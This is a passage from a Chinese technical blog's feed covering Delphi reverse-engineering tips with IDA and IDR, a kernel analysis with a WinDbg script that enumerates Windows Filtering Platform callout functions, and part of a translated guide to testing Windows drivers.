<div align="center"><br><img src="/img/20200802_dns_vmware.png" align="https证书错误，为Vmware"/><br></div>]]>
    
    </summary>
    
      <category term="DNS劫持" scheme="http://www.youngroe.com/tags/DNS%E5%8A%AB%E6%8C%81/"/>
    
      <category term="Life" scheme="http://www.youngroe.com/categories/Life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Delphi程序逆向反汇编技巧小记]]></title>
    <link href="http://www.youngroe.com/2019/07/01/Windows/delphi_reverse_summary/"/>
    <id>http://www.youngroe.com/2019/07/01/Windows/delphi_reverse_summary/</id>
    <published>2019-07-01T12:13:53.000Z</published>
    <updated>2020-07-22T12:59:47.350Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_Delphi语言基础">0x00 Delphi语言基础</h2><h3 id="1-Delphi语言概述">1.Delphi语言概述</h3><p>Delphi本身并非一种独立的语言，而是一种软件开发工具，是Object Pascal语言的一种开发工具。本身是大名鼎鼎的Borland公司开发的一种开发环境，包含IDE、图形界面库Visual Component Library(VCL)及数据库相关功能。其图像界面库VCL类似MFC，使用PME（Property/Method/Event）的开发模式。<br><a id="more"></a><br>VCL采用特有的RCDATA资源格式，RCDATA中包含有Delphi窗口（Forms）信息，当程序运行时通过初始化代码建立窗口，从RCDATA中获取所需要的信息。RCDATA信息可以通过PE Explorer等PE编辑器查看。</p>
<div align="center"><br><img src="/img/Delphi RCDATA.jpg" alt="Delphi窗口Form信息" align="center"><br></div><br>Delphi版本较多，不同版本有一些差异，目前已经发布的版本包括1-7, 2005, 2006, 2007, 2009, 2010, XE-XE8、10、10.1、10.2、10.3。Delphi的API查询可以通过参考链接2进行查询。<br><br>### 2.Delphi二进制特点<br><br>可以通过exeinfo/Detect It Easy等工具判断PE文件是否为Delphi开发及确定具体的Delphi版本信息，确定具体的版本信息有助于后续反汇编工具的设置，使工具反汇编出可读性更高的汇编代码。<br>Delphi常用的字符串的内存布局不同于C/C++的char*或则string对象，Delphi使用的字符串都是Pascal的字符串，在原始字符串前面存放的是字符串的长度<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint32_t len;</span><br><span class="line"><span class="keyword">char</span>    <span class="keyword">str</span>[];</span><br></pre></td></tr></table></figure><br><br><div align="center"><br><img src="/img/Delphi Str.jpg" alt="Delphi字符串内存布局" align="center"><br></div>

<p>Delphi遵循_fastcall调用约定，但是与Windows的_fastcall略有不同，参数顺序为eax为第一个参数、edx为第二个参数、ecx为第三个参数，大于3个的参数通过堆栈传递，大于三个的堆栈顺序从左到右依次压栈，堆栈由被调用者恢复。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="number">00451F</span>91   <span class="number">6</span>A04                   push    $<span class="number">04</span></span><br><span class="line"><span class="number">00451F</span>93   <span class="number">6</span>A05                   push    $<span class="number">05</span></span><br><span class="line"><span class="number">00451F</span>95   B903000000             mov     ecx, $<span class="number">00000003</span></span><br><span class="line"><span class="number">00451F</span>9A   BA02000000             mov     edx, $<span class="number">00000002</span></span><br><span class="line"><span class="number">00451F</span>9F   B801000000             mov     eax, $<span class="number">00000001</span></span><br><span class="line"><span class="number">00451F</span>A4   E8C7FFFFFF             call    <span class="number">00451F</span>70</span><br></pre></td></tr></table></figure></p>
<p>Delphi的按钮事件地址是通过按钮名字和地址绑定的，具体为一个按钮名称对应一个按钮事件响应函数地址。而按钮名称可以在Delphi的RCDATA资源中找到，具体为通过PE Explorer打开资源RC数据，找到相应界面的Form，找到按钮名称的字符串值。</p>
<div align="center"><br><img src="/img/Delphi Button.jpg" alt="Delphi Form中的按钮信息" align="center"><br></div><br>这里为”Button1Click”，然后再IDA或则16进制编辑器中搜索该字符串，应该可以找到两个Button1Click字符串。其中一个是资源本身，另一个是事件地址和事件响应函数地址表，其中上面是地址下面是名称，Button1Click的地址表如下：<br><div align="center"><br><img src="/img/Delphi Button Func.jpg" alt="Delphi Form中的按钮信息" align="center"><br></div>

<h2 id="0x01_反汇编Delphi如何设置IDA_pro">0x01 反汇编Delphi如何设置IDA pro</h2><p>在使用ida进行反汇编时，大多数情况我们都会使用ida默认设置进行的反编译，在具体到某个函数时会对反汇编的字符串、语言、函数调用约定等进行一些小的调整。对一般程序这种设置反汇编效果都还不错，但是对Delphi程序这样反汇编出来的代码可读性很差，具体表现是函数的调用约定可能识别错误，字符串信息也不能自动识别。这时我们可以通过手动设置ida的反汇编选项对反汇编效果进行调节，具体如下：</p>
<ul>
<li>Load a new file,取消勾选的Analysis下的两个自动分析选项</li>
<li>Options–&gt;Compiler:Compiler（Delphi）、Calling convention(FastCall)</li>
<li>Options–&gt;General–&gt;String:Default string literal type(Pascal/Pascal16)</li>
<li>View–&gt;View–&gt;Open Subviews–&gt;Type libraries, remove the defaults</li>
<li>View–&gt;Open Subviews–&gt;Signatures–&gt;Apply new Signatures:选择delphi相关Signatures</li>
<li>Edit–&gt;Select all,在IDA View区域右键Analyze selected area</li>
</ul>
<p>经过这样一番设置后，IDA反汇编出来的效果比默认设置会好很多，但是IDA毕竟是一个通用反汇编工具，对Delphi程序的效果只能说差强人意，对delphi的一些库函数识别有限，并且对RCDATA的资源也未做特定解析，但是好在有另外一个神器，能大大优化IDA的不足，它就是IDR。</p>
<h2 id="0x02_Delphi反汇编大杀器IDR">0x02 Delphi反汇编大杀器IDR</h2><p><div align="center"><br><img src="/img/Delphi IDR.jpg" alt="IDR窗口" align="center"><br></div><br>IDR全称为Interactive Delphi Reconstructor，从名字上我们就可以知道这是一款专门针对Delphi的反汇编工具，工具下载地址可以参考参考链接3、4，主要模块包括:</p>
<ul>
<li>Idr.exe，IDR主功能模块</li>
<li>dis.dll 反汇编模块</li>
<li>*.bin  类似IDA的sig文件，用于识别Delphi的库函数</li>
</ul>
<p>IDR相对于IDA的优势如下：</p>
<ul>
<li>得益于多个版本的符号bin文件，IDR能够识别大部分Delphi库函数，比IDA的识别率高很多</li>
<li>默认设置直接解析delphi程序的字符串信息，在IDR Strings可以查看和搜索这些字符串</li>
<li>可视化查看delphi的RCDATA信息Form界面信息，并且能够直接获得按钮等元素的响应函数地址</li>
<li>ClassViewer窗口可直接查看部分类及函数名称，猜测这部分函数为RCDATA中声明的函数或则类似C++的RTTI信息</li>
</ul>
<p>虽然IDR针对Delphi程序的反汇编有这么多优势，但是相对于IDA还是缺少一些反汇编的高级功能，如图形化展示反汇编函数图、F5功能等。但好在IDR提供了导出功能，可以导出map、idc文件供IDA使用，这样就可以结合两个工具的优势分析Delphi程序，这样简直得心应手啊。</p>
<h2 id="0x03_简单总结">0x03 简单总结</h2><p>当分析一种新的语言或则类库开发的程序的时候，还是可以通过搜索或则询问学习一些该语言的基础知识，如字符串内存布局、默认调用约定等，这样在逆向分析时候可以大大增加我们的效率，减少体力活。<br>同时在学习到一些基础知识后，我们也能更好的使用所用的工具，不要迷信自动分析，必要时通过手动设置一些选项也能大大增加我们逆向分析的效率。</p>
<h2 id="0x04_参考链接">0x04 参考链接</h2><p><a href="https://zh.wikipedia.org/wiki/Delphi" target="_blank" rel="external">1.Delphi维基百科</a><br><a href="http://docwiki.embarcadero.com/Libraries/Tokyo/en/Main_Page" target="_blank" rel="external">2.Delphi语言的MSDN</a><br><a href="https://github.com/crypto2011/IDR" target="_blank" rel="external">3.IDR github</a><br><a href="https://www.52pojie.cn/thread-367796-1-1.html" target="_blank" rel="external">4.IDR下载地址</a><br><a href="https://forum.exetools.com/showthread.php?p=117450&amp;nojs=1" target="_blank" rel="external">5.Reverse engineering Delphi executables?</a><br><a href="https://reverseengineering.stackexchange.com/questions/2873/which-ida-pro-signature-should-be-used-for-borland-delphi-6-0-7-0-binaries-as-re" target="_blank" rel="external">6.which-ida-pro-signature-should-be-used-for-borland-delphi-6-0-7-0-binaries-as-re</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_Delphi语言基础">0x00 Delphi语言基础</h2><h3 id="1-Delphi语言概述">1.Delphi语言概述</h3><p>Delphi本身并非一种独立的语言，而是一种软件开发工具，是Object Pascal语言的一种开发工具。本身是大名鼎鼎的Borland公司开发的一种开发环境，包含IDE、图形界面库Visual Component Library(VCL)及数据库相关功能。其图像界面库VCL类似MFC，使用PME（Property/Method/Event）的开发模式。<br>]]>
    
    </summary>
    
      <category term="Delphi" scheme="http://www.youngroe.com/tags/Delphi/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows内核重拾：如何枚举系统中Windows Filtering Platform (WFP)驱动中的callout函数]]></title>
    <link href="http://www.youngroe.com/2019/06/25/Kernel/kernel_enum_wfp_callout_function/"/>
    <id>http://www.youngroe.com/2019/06/25/Kernel/kernel_enum_wfp_callout_function/</id>
    <published>2019-06-25T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.201Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>WFP是Windows提供的一套新的网络数据包过滤框架，用于取代之前的TDI过滤框架，为用户态和内核态都提供API支持，可以很方便的实现网络数据包拦截/编辑，常用于实现防火墙、网速控制及入侵检测等。<br><a id="more"></a></p>
<p><div align="center"><br><img src="/img/wfp_arch.jpg" alt="WFP框架" align="center"><br></div><br>WFP架构如上图所示，虽然提供了用户态和内核态的接口，但是干事情部分都在内核层，关于WFP驱动的开发可以看下参考链接1。<br>在内核态最主要干活的，是通过FwpsCalloutRegister注册的三个回调函数，注册成功后会返回一个callout_id用于标识被注册的wfp callout对象。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> FWPS_<span class="built_in">CALLOUT1_</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// Uniquely identifies the callout. This must be the same GUID supplied to</span></span><br><span class="line">   <span class="comment">// FwpmCalloutAdd0.</span></span><br><span class="line">   G<span class="built_in">UID</span> calloutKey;</span><br><span class="line">   <span class="comment">// Flags</span></span><br><span class="line">   <span class="built_in">UINT32</span> flags;</span><br><span class="line">   <span class="comment">// Pointer to the classification function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_CLASSIFY_FN1</span> classifyFn;</span><br><span class="line">   <span class="comment">// Pointer to the notification function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_NOTIFY_FN1</span> notifyFn;</span><br><span class="line">   <span class="comment">// Pointer to the flow delete function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_FLOW_DELETE_NOTIFY_FN0</span> flowDeleteFn;</span><br><span class="line">&#125; FWPS_<span class="built_in">CALLOUT1</span>;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>classifyFn：主要干活的回调，可以获得网络包全部信息(与注册类型相关)，可以实现网络包数据拦截、编辑等。</li>
<li>notifyFn：当过滤器被添加到过滤引擎时被调用。</li>
<li>flowDeleteFn：当一个网络数据被终止时调用，这个函数中可以对classifyfn中的操作进行清理。<br>那如何枚举出这三个函数呢，如何实现类似Pchunter中枚举系统回调的功能呢，关联出时哪一个驱动注册的wfp网络过滤函数？</li>
</ul>
<h2 id="0x01_分析">0x01 分析</h2><p>最好的方式是找找有没用类似功能的软件，或则前人相关的分析。无奈只能找到一个参考链接2中的msdn中的一个帖子，用户态提供FwpmCalloutEnum这个api可以枚举出系统中wfp信息，只有callout_id，没有注册这个callout的模块和callout function信息。<br>倒是有工具实现了这个功能，<a href="https://github.com/AxtMueller/Windows-Kernel-Explorer" target="_blank" rel="external">Windows-Kernel-Explorer</a>实现了，但是模块加了VMP，不是很好分析。那就正面入手分析callout function如何注册到系统的了。<br>好在函数逻辑很简单，函数调用链大概如下:fwpkclnt.sys!FwpsCalloutRegister1—–&gt;netio!KfdAddCalloutEntry——&gt;netio!FeAddCalloutEntry，核心代码在函数FeAddCalloutEntry中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000026</span>CA6 <span class="number">48</span> <span class="number">8</span>B <span class="number">05</span> F3 <span class="number">79</span> <span class="number">03</span> <span class="number">00</span>                    mov     rax, cs:gWfpGlobal</span><br><span class="line">.text:<span class="number">0000000000026</span>CAD <span class="number">8</span>B <span class="number">5</span>C <span class="number">24</span> <span class="number">68</span>                             mov     ebx, [rsp+<span class="number">38</span>h+call_out_id_a6]</span><br><span class="line">.text:<span class="number">0000000000026</span>CB1 <span class="number">48</span> C1 E3 <span class="number">06</span>                             shl     rbx, <span class="number">6</span></span><br><span class="line">.text:<span class="number">0000000000026</span>CB5 <span class="number">48</span> <span class="number">03</span> <span class="number">98</span> <span class="number">50</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>                    add     rbx, [rax+<span class="number">550</span>h]</span><br><span class="line">.text:<span class="number">0000000000026</span>CBC <span class="number">48</span> <span class="number">8</span>B CB                                mov     rcx, rbx</span><br><span class="line">.text:<span class="number">0000000000026</span>CBF E8 <span class="number">6</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          call    IsCalloutEntryAvailable</span><br><span class="line">.text:<span class="number">0000000000026</span>CC4 <span class="number">48</span> <span class="number">8</span>B F8                                mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CC7 <span class="number">48</span> <span class="number">85</span> C0                                test    rax, rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CCA <span class="number">0F</span> <span class="number">85</span> <span class="number">10</span> <span class="number">8</span>C FF FF                       jnz     loc_1F8E0</span><br><span class="line">.text:<span class="number">0000000000026</span>CD0 <span class="number">48</span> <span class="number">89</span> <span class="number">03</span>                                mov     [rbx], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CD3 <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">08</span>                             mov     [rbx+<span class="number">8</span>], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CD7 <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">28</span>                             mov     [rbx+<span class="number">28</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CDB <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">30</span>                             mov     [rbx+<span class="number">30</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CDF <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">38</span>                             mov     [rbx+<span class="number">38</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CE3 <span class="number">8</span>B <span class="number">44</span> <span class="number">24</span> <span class="number">60</span>                             mov     eax, dword ptr [rsp+<span class="number">38</span>h+arg_20]</span><br><span class="line">.text:<span class="number">0000000000026</span>CE7 <span class="number">48</span> <span class="number">89</span> <span class="number">73</span> <span class="number">20</span>                             mov     [rbx+<span class="number">20</span>h], rsi</span><br><span class="line">.text:<span class="number">0000000000026</span>CEB <span class="number">48</span> <span class="number">8</span>B <span class="number">74</span> <span class="number">24</span> <span class="number">70</span>                          mov     rsi, [rsp+<span class="number">38</span>h+device_object]</span><br><span class="line">.text:<span class="number">0000000000026</span>CF0 <span class="number">44</span> <span class="number">89</span> <span class="number">2</span>B                                mov     [rbx], r13d</span><br><span class="line">.text:<span class="number">0000000000026</span>CF3 C7 <span class="number">43</span> <span class="number">04</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    mov     dword ptr [rbx+<span class="number">4</span>], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000026</span>CFA <span class="number">4</span>C <span class="number">89</span> <span class="number">63</span> <span class="number">10</span>                             mov     [rbx+<span class="number">10</span>h], r12</span><br><span class="line">.text:<span class="number">0000000000026</span>CFE <span class="number">48</span> <span class="number">89</span> <span class="number">6</span>B <span class="number">18</span>                             mov     [rbx+<span class="number">18</span>h], rbp</span><br><span class="line">.text:<span class="number">0000000000026</span>D02 <span class="number">89</span> <span class="number">43</span> <span class="number">28</span>                                mov     [rbx+<span class="number">28</span>h], eax</span><br><span class="line">.text:<span class="number">0000000000026</span>D05 <span class="number">48</span> <span class="number">85</span> F6                                test    rsi, rsi</span><br><span class="line">.text:<span class="number">0000000000026</span>D08 <span class="number">0F</span> <span class="number">85</span> BD <span class="number">8</span>B FF FF                       jnz     loc_1F8CB</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E                         loc_26D0E:                              ; CODE XREF: FeAddCalloutEntry-<span class="number">7398</span>↑j</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E                                                                 ; FeAddCalloutEntry-<span class="number">7380</span>↑j</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E <span class="number">48</span> <span class="number">8</span>B <span class="number">5</span>C <span class="number">24</span> <span class="number">40</span>                          mov     rbx, [rsp+<span class="number">38</span>h+arg_0]</span><br><span class="line">.text:<span class="number">0000000000026</span>D13 <span class="number">48</span> <span class="number">8</span>B <span class="number">6</span>C <span class="number">24</span> <span class="number">48</span>                          mov     rbp, [rsp+<span class="number">38</span>h+arg_8]</span><br><span class="line">.text:<span class="number">0000000000026</span>D18 <span class="number">48</span> <span class="number">8</span>B <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>                          mov     rsi, [rsp+<span class="number">38</span>h+arg_10]</span><br><span class="line">.text:<span class="number">0000000000026</span>D1D <span class="number">48</span> <span class="number">8</span>B C7                                mov     rax, rdi</span><br><span class="line">.text:<span class="number">0000000000026</span>D20 <span class="number">48</span> <span class="number">83</span> C4 <span class="number">20</span>                             add     rsp, <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000026</span>D24 <span class="number">41</span> <span class="number">5</span>D                                   pop     r13</span><br><span class="line">.text:<span class="number">0000000000026</span>D26 <span class="number">41</span> <span class="number">5</span>C                                   pop     r12</span><br><span class="line">.text:<span class="number">0000000000026</span>D28 <span class="number">5F</span>                                      pop     rdi</span><br><span class="line">.text:<span class="number">0000000000026</span>D29 C3                                      retn</span><br></pre></td></tr></table></figure></p>
<p>可以分析出对于每一个注册的callout，都会将callout的callout function信息放入一个结构体中，这些结构体都放在一个数组中，猜测这个结构体的名称叫CalloutEntry，每一个CallOutEntry的大小应该是64(左移6位，相当于乘以64)。而每一个callout_id对应的CallOutEntry结构的基地址应该等于[[gWfpGlobal]+0x550] + callout_id*64，而CallOutEntry结构体内容应该如下所示。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x0</span>   unknow1</span><br><span class="line">+<span class="number">0x8</span>   unknow2</span><br><span class="line">+<span class="number">0x10</span>  classifyFn</span><br><span class="line">+<span class="number">0x18</span>  notifyFn</span><br><span class="line">+<span class="number">0x20</span>  flowDeleteFn</span><br><span class="line">+<span class="number">0x28</span>  unknow3</span><br><span class="line">+<span class="number">0x30</span>  unknow4</span><br><span class="line">+<span class="number">0x38</span>  device_object</span><br></pre></td></tr></table></figure></p>
<p>分析到这里再通过关键词gWfpGlobal搜索，可以找到参考链接3，参考链接3给出了一个windbg脚本，这里可以优化下，可以直接再Win7 x64系统下打印出系统中所有的callout function函数地址（如果提示找不到符号地址，可以执行下.reload /f /i netio.sys）。<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r <span class="variable">$t0</span>=poi(poi(netio!gWfpGlobal)+<span class="number">0x550</span>);.<span class="keyword">for</span> ( r <span class="variable">$t1</span>=<span class="number">0</span>; @<span class="variable">$t1</span> &lt; <span class="number">11</span>e; r <span class="variable">$t1</span>=@<span class="variable">$t1</span>+<span class="number">1</span> ) &#123;r <span class="variable">$t1</span>;dps @<span class="variable">$t0</span>+<span class="number">2</span>*@<span class="variable">$ptrsize</span> L3; r <span class="variable">$t0</span>=@<span class="variable">$t0</span>+<span class="number">40</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02_参考">0x02 参考</h2><p><a href="https://qwertwwwe.github.io/windows-driver-develop-wfp-framework/" target="_blank" rel="external">1.windows驱动-WFP框架介绍及其编程</a><br><a href="https://social.msdn.microsoft.com/Forums/vstudio/en-US/66f1f00b-eab5-4d60-b8da-55010d023ebf/list-of-callout-drivers?forum=wfp" target="_blank" rel="external">2.List of callout drivers</a><br><a href="https://www.codemachine.com/article_findwfpcallouts.html" target="_blank" rel="external">3.Finding Windows Filtering Platform (WFP) Callouts</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>WFP是Windows提供的一套新的网络数据包过滤框架，用于取代之前的TDI过滤框架，为用户态和内核态都提供API支持，可以很方便的实现网络数据包拦截/编辑，常用于实现防火墙、网速控制及入侵检测等。<br>]]>
    
    </summary>
    
      <category term="驱动" scheme="http://www.youngroe.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="Kernel" scheme="http://www.youngroe.com/categories/Kernel/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows内核重拾：Windows驱动测试基础：工具、功能和示例（翻译/转载）]]></title>
    <link href="http://www.youngroe.com/2019/05/06/Kernel/windows-driver-testing-basics/"/>
    <id>http://www.youngroe.com/2019/05/06/Kernel/windows-driver-testing-basics/</id>
    <published>2019-05-06T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.204Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>本文旨在帮助你测试Windows驱动程序。因为有很多种不同的驱动程序，因此我们将介绍关于每种类型驱动程序的细节及各种驱动程序测试过程的不同点。我们也将涉及到一些驱动测试辅助工具和另一个重要的主题驱动数字签名。<br><a id="more"></a></p>
<h2 id="0x01_Windows驱动程序的定义及类型">0x01 Windows驱动程序的定义及类型</h2><p>驱动程序是为物理或则虚拟设备提供接口的一种软件组件。驱动程序将来自用户程序和操作系统的high-level的请求翻译成物理/虚拟设备能够识别的low-level的指令。</p>
<h3 id="Windows系统的驱动文件">Windows系统的驱动文件</h3><p>Windows系统中，驱动文件以.sys扩展名文件存储，可能还会有以.inf或则.cat为后缀的辅助文件存在。<br><strong>.inf文件</strong><br>.inf文件是驱动程序安装文件，其中包含了设计驱动程序的设备的类型，驱动程序文件的位置以及所有依赖项。在驱动程序安装过程中，这些配置将从.inf文件写入到到注册表中，注册表作为驱动的配置文件。<br><strong>.cat文件</strong><br>.cat文件包含所有驱动程序文件的哈希值总和的列表。在Windows中，已安装的驱动程序通常保存在在%SystemRoot%\System32\drivers目录下，但也可以存储在任何其他位置。安装后，驱动程序已加载到系统中并可以使用。某些驱动程序类型在安装后需要重新启动。<br><!-- more --></p>
<h3 id="驱动类型">驱动类型</h3><p>根据执行模式的不同，驱动程序可以分为用户模式驱动和内核模式驱动。</p>
<h4 id="用户模式驱动(User-Mode_Drivers)">用户模式驱动(User-Mode Drivers)</h4><p>用户模式驱动程序在用户应用程序和其他操作系统组件（例如内核模式驱动程序）之间提供接口。打印机驱动程序就是是一种用户模式驱动程序。</p>
<h4 id="内核模式驱动(Kernel-Mode_Drivers)">内核模式驱动(Kernel-Mode Drivers)</h4><p>内核模式驱动程序在内核特权模式下执行。不同内核模式驱动在执行期间通常会存在链式关系。每个驱动程序在链中的位置根据其作用不同。<br>一个用户模式程序查询设备的请求通常会经过多个驱动程序。经过的每一个驱动程序都将处理和过滤这个查询，根据Windows驱动程序术语这个包被称为IRP包（I/O请求包）。如果将驱动程序加载到链中的错误位置，则查询将被错误地处理，还有可能导致系统崩溃。<br>下面的图1表示磁盘的输入输出（I/O）查询的简化模型。用户应用程序创建查询以读取磁盘上的文件。该查询通过一系列驱动程序，每个驱动程序都会处理传入和传出的数据包。</p>
<div align="center"><br><img src="/img/driver_test_driver_chain.png" alt="图1 应用程序通过驱动查询的简化模型" align="center"><br></div>

<p>在本文中，我们将重点介绍内核模式驱动程序。<br>内核模式驱动程序可以分为以下几种类型：</p>
<ul>
<li>即插即用设备驱动程序：这些驱动程序可以访问物理即插即用（PnP）设备并管理设备电源。</li>
<li>非即插即用驱动程序：这些驱动程序增强了用户应用程序功能，并提供了对通过标准API调用不可用的内核模式功能的访问。这些驱动程序不适用于物理设备。</li>
<li><p>文件系统驱动程序：这些驱动程序提供对文件系统的访问。它们将用于读取/记录文件的高级查询转换为用于磁盘驱动器的低级命令（在物理磁盘上读取/记录扇区）。<br>Windows包含两种驱动开发模型：Windows驱动程序模型（WDM）、Windows驱动程序框架（WDF）。WDF由内核模式驱动程序框架（KMDF）和用户模式驱动程序框架（UMDF）组成的。WDM和WDF都简化了使驱动程序代码在Windows版本之间兼容的难度。<br>WDM中包含以下驱动程序类型：</p>
</li>
<li><p>总线类型驱动:这些驱动程序支持特定的PCI，SCSI，USB或其他端口，以控制新设备与总线的连接。</p>
</li>
<li>功能驱动：这些驱动程序可确保特定设备的功能。它们通常支持读取/记录操作和设备电源管理。</li>
<li>过滤驱动：这些驱动程序修改对设备的查询。它们可以位于驱动程序链中功能驱动程序的上方或下方。</li>
</ul>
<h3 id="驱动程序与设备之间的关系">驱动程序与设备之间的关系</h3><p>每个内核模式驱动程序都与特定的设备一起使用，在Windows中以设备对象表示。这意味着通过驱动程序进行的I/O查询的最终目的地始终是物理或虚拟设备。这既适用于物理PnP设备的驱动程序，也适用于非PnP软件驱动程序。在测试驱动程序时，必须了解用户应用程序和设备之间存在多个驱动程序。在驱动程序执行链中每个驱动程序都可以影响对设备的最终查询结果。</p>
<h2 id="0x02_Windows驱动程序测试主要内容">0x02 Windows驱动程序测试主要内容</h2><p>不管是Linux还是Windows，有一些特定的测试是驱动程序测试所必需的，并且与驱动程序类型无关。因此，在介绍测试不同类型驱动程序的细微差别之前，我们将首先考虑它们的共性。</p>
<h3 id="不同操作系统">不同操作系统</h3><p>首先，您必须始终牢记，特定的驱动程序在不同的操作系统上的行为可能有所不同。此外，您需要考虑不同的内核版本，因为即使在同一操作系统中它们也可能有所不同。例如，Windows7和Windows7 sp1具有不同的内核。因此，您必须测试尽可能多的系统。值得一提的是，Microsoft目前还在继续支持的操作系统是从Win7/2008开始的。您还必须考虑到现在最流行的Windows版本是Windows 7和10。</p>
<h3 id="更新">更新</h3><p>有必要测试驱动程序在特殊情况下的运行情况，例如关机，重新启动和重置。您还应该牢记系统的安全特性：防火墙，数据执行保护（DEP），用户帐户控制（UAC）和杀毒软件。操作系统更新也会影响驱动程序功能。因此将操作系统更新到最新版本测试至关重要。此外，您还需要测试驱动程序更新。</p>
<h3 id="硬件依赖性">硬件依赖性</h3><p>除了软件依赖性外，还有硬件依赖性。因此，您必须测试驱动程序在启用和禁用的页面文件、多处理器及多内核的运行情况。在测试驱动程序时，必须启用driver verifier，这将为驱动程序增加另外的测试压力。在测试过程中，请检查驱动程序安装和卸载，系统重置和休眠的正确性。</p>
<h2 id="0x03_如何测试Windows驱动程序">0x03 如何测试Windows驱动程序</h2><p>测试驱动程序过程中始终会发生各种问题的，错误的操作甚至会导致严重的后果。因此，您应该在虚拟机中测试驱动程序直到稳定为止。</p>
<h3 id="文件系统过滤器驱动程序">文件系统过滤器驱动程序</h3><p>顾名思义，文件系统过滤驱动程序用于文件系统。因此，在测试此类驱动程序时，应使用NTFS，FAT32，exFAT和ReFS等文件系统进行测试。<br>为了正确测试Windows驱动程序，除了系统文件管理器Explorer之外，还应使用各种文件管理器，例如FAR或Windows Total Commander进行测试。此外，除了简单的操作（如复制，删除和重命名）外，不要忘记复杂的文件操作和文件系统变更。<br>复杂的文件系统变更包括：</p>
<ul>
<li>挂载/卸载新磁盘：<ul>
<li>ISO image</li>
<li>网络磁盘</li>
<li>虚拟硬盘</li>
<li>U盘</li>
</ul>
</li>
<li>进行磁盘扇区配置变更（更改驱动器号或名称）</li>
<li>在磁盘上执行的操作<ul>
<li>格式化分区</li>
<li>压缩分区</li>
<li>分区碎片整理</li>
<li>磁盘坏道检查</li>
<li>删除分区</li>
<li>磁盘动态化</li>
<li>在GPT / MBR中转换磁盘</li>
<li>创建新分区<br>您还必须检查：</li>
</ul>
</li>
<li>各种硬件配置（具有不同容量的SSD和HDD）</li>
<li>停止和启动服务或安装/卸载应用程序时的驱动程序行为</li>
